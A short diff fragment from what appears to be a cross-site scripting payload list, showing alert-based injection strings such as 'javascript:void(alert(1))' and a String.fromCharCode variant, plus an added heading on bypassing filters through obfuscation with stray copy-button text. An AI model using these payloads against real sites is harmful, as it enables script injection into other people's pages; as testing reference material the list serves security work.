@@ -62,3 +62,9 @@ javascript:void(alert(1))
 "+alert(1)+""        
 "+alert(String.fromCharCode(88,83,83))+"
 
+
+
+🔐 Bypass Filters Using Arithmetic and Obfuscation
+js
+Copy
+Edit
